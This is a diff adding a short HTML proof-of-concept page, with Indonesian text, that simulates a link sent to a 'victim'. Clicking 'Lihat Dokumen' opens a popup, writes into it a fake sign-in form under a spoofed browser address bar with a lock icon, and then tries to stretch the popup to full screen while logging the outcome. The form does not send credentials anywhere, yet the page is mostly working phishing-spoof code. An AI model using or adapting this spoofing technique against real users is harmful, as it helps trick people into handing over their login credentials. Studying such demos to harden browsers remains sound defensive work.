@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<title>Dokumen Dibagikan</title>
+<style>
+ body{font-family:Arial;padding:40px;background:#f5f7fb;max-width:640px;margin:0 auto;text-align:center;}
+ button{padding:14px 28px;font-size:17px;cursor:pointer;background:#1a73e8;color:#fff;border:none;border-radius:6px;}
+ #log{position:fixed;bottom:0;left:0;right:0;background:#fff7cc;font-family:monospace;font-size:11px;max-height:160px;overflow:auto;padding:6px;border-top:2px solid #cc0;text-align:left;}
+</style>
+</head>
+<body>
+<h1>Dokumen Dibagikan Untuk Anda</h1>
+<p>Satu file, satu klik. Klik tombol di bawah untuk simulasi "link" yang dikirim ke victim.</p>
+<button id="view">Lihat Dokumen</button>
+<div id="log"></div>
+
+<script>
+function log(m){
+  const el=document.getElementById('log');
+  const l=document.createElement('div');
+  l.textContent=new Date().toISOString()+' '+m;
+  el.appendChild(l);
+  el.scrollTop=el.scrollHeight;
+}
+
+const fakeChromeHTML = `
+<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><title>Sign in</title>
+<style>
+  html,body{margin:0;height:100%;font-family:Arial;}
+  .fakebar{height:36px;background:#e8eaed;display:flex;align-items:center;padding:0 10px;font-size:12px;color:#3c4043;box-shadow:0 1px 3px rgba(0,0,0,.2);}
+  .fakebar .lock{color:#1a73e8;margin-right:6px;}
+  .body{padding:30px;}
+  input{width:100%;padding:8px;margin:6px 0;box-sizing:border-box;}
+</style></head>
+<body>
+  <div class="fakebar"><span class="lock">&#128274;</span>https://accounts.example-login-demo.test/oauth</div>
+  <div class="body">
+    <h3>Sesi berakhir, masuk lagi</h3>
+    <input placeholder="Email">
+    <input placeholder="Password" type="password">
+    <button onclick="document.title='clicked'">Lanjutkan</button>
+  </div>
+</body></html>
+`;
+
+document.getElementById('view').addEventListener('click', () => {
+  const w = window.open('', 'spoofwin', 'width=380,height=520,top=150,left=150,toolbar=no,location=no,menubar=no,status=no,scrollbars=no,resizable=yes');
+  if (!w) { log('window.open DIBLOKIR oleh popup blocker'); return; }
+
+  w.document.open();
+  w.document.write(fakeChromeHTML);
+  w.document.close();
+
+  log('popup dibuka & diisi fake chrome. Ukuran awal: ' + w.outerWidth + 'x' + w.outerHeight);
+
+  setTimeout(() => {
+    try {
+      w.moveTo(0, 0);
+      w.resizeTo(screen.availWidth, screen.availHeight);
+      log('setelah moveTo(0,0)+resizeTo(layar penuh): ukuran jadi ' + w.outerWidth + 'x' + w.outerHeight + ' posisi (' + w.screenX + ',' + w.screenY + ')');
+    } catch (e) {
+      log('resize/move error: ' + e);
+    }
+  }, 800);
+});
+</script>
+</body>
+</html>
